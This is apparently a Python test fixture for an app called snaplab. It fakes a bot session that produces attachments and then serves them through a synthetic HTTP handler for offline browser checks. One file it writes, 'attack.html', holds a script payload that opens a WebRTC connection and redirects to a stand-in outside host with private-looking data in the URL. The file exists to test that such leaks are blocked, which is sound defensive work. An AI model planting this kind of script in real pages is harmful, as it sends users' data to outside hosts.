"""Synthetic HTTP handler over stdio for offline browser checks. Never opens a socket or a real data folder."""
import base64
import io
import json
from pathlib import Path
import sys
import tempfile
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))
from helpers import fake_credentials, make_app, onboard
from snaplab import auth, server
from snaplab.harnesses.base import TurnResult
from snaplab.sessions import Control


def request(app, item):
    headers = {k: v for k, v in item.get("headers", {}).items() if k.lower() not in ("connection", "content-length", "accept-encoding")}
    body = item.get("body", "").encode()
    headers.update({"Connection": "close", "Content-Length": str(len(body))})
    raw = (f"{item.get('method', 'GET')} {item['path']} HTTP/1.1\r\n" +
           "".join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n").encode() + body
    class Connection:
        output = bytearray()
        def makefile(self, *args):
            return io.BytesIO(raw)
        def sendall(self, data):
            self.output.extend(data)
    conn = Connection()
    handler = type("FixtureHandler", (server.Handler,), {"app": app})
    handler(conn, ("127.0.0.1", 12345), None)
    head, data = bytes(conn.output).split(b"\r\n\r\n", 1)
    lines = head.decode().split("\r\n")
    return {"responseCode": int(lines[0].split()[1]),
            "responseHeaders": [{"name": k, "value": v} for k, v in
                                (line.split(": ", 1) for line in lines[1:]) if k.lower() not in ("connection", "content-length")],
            "body": base64.b64encode(data).decode()}


def main():
    scratch = ROOT / ".tmp-round11"
    scratch.mkdir(exist_ok=True)
    with fake_credentials(), patch("snaplab.gitops.available", return_value=False), \
         patch("snaplab.auth.tailscale_status", return_value={}), tempfile.TemporaryDirectory(dir=scratch) as tmp:
        app, _, _ = make_app(tmp=tmp, sessions={"report_by_bot": False})
        try:
            bot = onboard(app, lang="ja", name="Builder")["bot"]
            app.public_url = "https://snaplab.test"
            project = app.create_project(name="Schedule", bot=bot["id"])
            with patch.object(app.sessions, "_start"):
                session = app.sessions.create(project, "bot", "予定表を作り、画面の写真を送ってください。", bot=bot["id"])
            def run(s, folder, prompt, ctl, first):
                (folder / "index.html").write_bytes((ROOT / "tests/fixtures/round11-app.html").read_bytes())
                (folder / "screenshot.png").write_bytes(Path(sys.argv[1]).read_bytes())
                (folder / ".snaplab/attachments.json").write_text(json.dumps([
                    {"path": "screenshot.png", "caption": "スマホの幅で撮った予定表です。"},
                    {"path": "index.html", "caption": "予定表の HTML を保存できます。"}]), encoding="utf-8")
                return TurnResult(ok=True, last_message="予定表と画面の写真を作りました。")
            with patch.object(app.sessions.harnesses["bot"], "run_turn", side_effect=run):
                app.sessions._turn(session["id"], "予定表を作ってください。", True, Control(app.sessions, session["id"]))
            session = app.store.session(session["id"])
            folder = app.sessions.workdir(session, project)
            (folder / "attack.html").write_text(
                "<script>window.htmlExecuted=true; new RTCPeerConnection({iceServers:"
                "[{urls:'stun:outside.invalid'}]}); location.href='https://outside.invalid/?input=synthetic-private'</script>", encoding="utf-8")
            app.attachments.register_outputs(session, folder, [{"path": "attack.html", "change": "added"}])
            app.store.save_session(session)
            attack = app.attachments.create(session, "attack.html")
            token, _ = app.auth.new_pairing("Synthetic browser")
            _, value, device = app.auth.redeem(token, "Synthetic browser")
            print(json.dumps({"cookie_name": auth.COOKIE_NAME, "cookie_value": value, "room": session["room"],
                              "device": device["id"], "attack": attack["id"]}), flush=True)
            for line in sys.stdin:
                item = json.loads(line)
                if item.get("revoke"):
                    app.auth.revoke(device["id"])
                    result = {"revoked": True}
                else:
                    result = request(app, item)
                print(json.dumps({"id": item["id"], **result}), flush=True)
        finally:
            app.archive.close()


if __name__ == "__main__":
    main()
